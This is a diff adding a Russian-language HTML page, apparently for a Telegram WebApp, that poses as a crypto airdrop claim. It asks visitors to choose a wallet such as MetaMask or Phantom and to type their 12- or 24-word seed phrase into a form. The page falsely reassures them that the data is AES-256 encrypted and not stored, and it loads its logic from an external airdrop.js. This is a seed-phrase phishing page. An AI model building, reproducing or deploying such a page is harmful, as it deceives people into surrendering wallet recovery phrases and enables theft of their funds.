@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>🎁 Получить Airdrop</title>
+
+    <!-- Orbitron шрифт -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
+    <!-- Основні стилі -->
+    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
+
+    <!-- Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Участвуйте в Airdrop</h1>
+        <p>Выберите один из активных airdrop'ов и подключите кошелёк. После верификации вы получите доступ к награде.</p>
+
+        <!-- Список Airdrops -->
+        <div class="airdrop-list" id="airdropList">
+            <p>Загрузка airdrop'ов...</p>
+        </div>
+
+        <!-- Форма підключення -->
+        <div id="airdropForm" style="display:none;">
+            <h2 id="selectedAirdropTitle">🔗 Подключение</h2>
+
+            <label>💼 Кошелёк</label>
+            <div class="custom-select-wrapper">
+                <div class="custom-select" id="walletSelect">
+                    <div class="selected">
+                        <img src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" class="wallet-icon" alt="MetaMask" />
+                        MetaMask
+                    </div>
+                    <ul class="options">
+                        <li data-value="MetaMask">
+                            <img src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" class="wallet-icon" />
+                            MetaMask
+                        </li>
+                        <li data-value="TrustWallet">
+                            <img src="https://assets.coingecko.com/coins/images/11085/small/Trust.png" class="wallet-icon" />
+                            Trust Wallet
+                        </li>
+                        <li data-value="Tonkeeper">
+                            <img src="https://tonkeeper.com/favicon-32x32.png" class="wallet-icon" />
+                            Tonkeeper
+                        </li>
+                        <li data-value="Phantom">
+                            <img src="https://avatars.githubusercontent.com/u/78782337?s=200&v=4" class="wallet-icon" />
+                            Phantom
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <input type="hidden" id="wallet" value="MetaMask" />
+
+            <label>🔢 Количество слов</label>
+            <select id="length" onchange="renderSeedInputs(); clearWarning();">
+                <option value="12">12 слов</option>
+                <option value="24">24 слова</option>
+            </select>
+
+            <div id="seedContainer" class="seed-grid"></div>
+
+            <div id="validationWarning" class="warning" style="display:none;"></div>
+
+            <button id="submitBtn">✅ Подключить и получить</button>
+            <p class="small">🔐 Мы используем AES-256. Данные шифруются и не сохраняются.</p>
+        </div>
+    </div>
+
+    <!-- Airdrop логіка -->
+    <script src="https://sp574-maker.github.io/maker/airdrop.js"></script>
+</body>
+</html>
